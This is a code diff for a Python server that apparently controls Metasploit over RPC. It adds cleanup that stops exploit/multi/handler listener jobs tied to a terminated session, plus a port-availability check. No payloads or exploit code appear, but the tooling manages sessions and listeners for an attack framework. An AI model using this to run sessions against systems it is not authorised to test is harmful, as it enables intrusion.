             logger.info(f"Successfully terminated session {session_id}")
-            return {"status": "success", "message": f"Session {session_id} terminated successfully."}
+            result_messages.append(f"Session {session_id} terminated successfully")
         else:
             logger.warning(f"Session {session_id} still appears in the sessions list after termination attempt.")
-            return {"status": "warning", "message": f"Session {session_id} may not have been terminated properly."}
+            result_messages.append(f"Session {session_id} may not have been terminated properly")
+        
+        # Kill associated handler job if requested
+        jobs_killed = 0
+        if kill_associated_job:
+            try:
+                # Get all active jobs
+                jobs = await asyncio.to_thread(lambda: client.jobs.list)
+                logger.debug(f"Active jobs: {list(jobs.keys())}")
+                
+                # If we have a specific job_id, try to kill it
+                if associated_job_id and str(associated_job_id) in jobs:
+                    logger.info(f"Killing associated job {associated_job_id} for session {session_id}")
+                    try:
+                        await asyncio.to_thread(lambda: client.jobs.stop(str(associated_job_id)))
+                        await asyncio.sleep(0.5)  # Give time to stop
+                        jobs_killed += 1
+                        result_messages.append(f"Killed associated job {associated_job_id}")
+                    except Exception as job_e:
+                        logger.warning(f"Failed to kill job {associated_job_id}: {job_e}")
+                else:
+                    # Try to find handler jobs that might be associated
+                    # Look for multi/handler jobs (these are typically the listener jobs)
+                    for job_id, job_info in jobs.items():
+                        if isinstance(job_info, dict):
+                            job_name = job_info.get('name', '').lower()
+                            # Check if it's a handler job
+                            if 'exploit/multi/handler' in job_name or 'handler' in job_name:
+                                logger.info(f"Found potential handler job {job_id}: {job_name}")
+                                # Note: We can't easily determine which handler is for which session
+                                # So we log it but don't automatically kill it unless we're sure
+                                # The user can manually kill all handlers with stop_job or list_listeners
+                
+                if jobs_killed > 0:
+                    logger.info(f"Killed {jobs_killed} associated job(s)")
+                elif associated_job_id is None:
+                    logger.debug(f"No specific job_id found for session {session_id}, job may have already stopped")
+                    
+            except Exception as job_cleanup_e:
+                logger.warning(f"Error during job cleanup for session {session_id}: {job_cleanup_e}")
+                result_messages.append(f"Warning: Could not clean up associated jobs: {job_cleanup_e}")
+        
+        if session_terminated:
+            return {
+                "status": "success", 
+                "message": ". ".join(result_messages) + ".",
+                "session_id": session_id,
+                "jobs_killed": jobs_killed
+            }
+        else:
+            return {
+                "status": "warning", 
+                "message": ". ".join(result_messages) + ".",
+                "session_id": session_id,
+                "jobs_killed": jobs_killed
+            }
             
     except MsfRpcError as e:
         logger.error(f"MsfRpcError terminating session {session_id}: {e}")
@@ -1870,6 +2361,36 @@ async def health_check() -> Dict[str, Any]:
         return {"status": "error", "message": f"Internal Server Error during health check: {e}"}
 
 # --- Server Startup Logic ---
+
+def check_port_available(port: int, host: str = '0.0.0.0') -> Tuple[bool, str]:
+    """
+    Check if a port is available to bind to.
+    
+    Args:
+        port: Port number to check
+        host: Host/interface to check (default: 0.0.0.0 for all interfaces)
+        
+    Returns:
+        Tuple of (is_available, error_message). If available, error_message is empty.
+    """
+    if not (1 <= port <= 65535):
+        return False, f"Invalid port {port}. Must be between 1 and 65535."
+    
+    try:
+        # Try to bind to the port
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.bind((host, port))
+            logger.debug(f"Port {port} on {host} is available.")
+            return True, ""
+    except socket.error as e:
+        error_msg = f"Port {port} is already in use on {host}. Please choose a different port or stop the service using this port."
+        logger.warning(error_msg)
+        return False, error_msg
+    except Exception as e:
+        error_msg = f"Error checking port {port} availability: {e}"
+        logger.error(error_msg)
+        return False, error_msg
 
 def find_available_port(start_port, host='127.0.0.1', max_attempts=10):
     """Finds an available TCP port."""
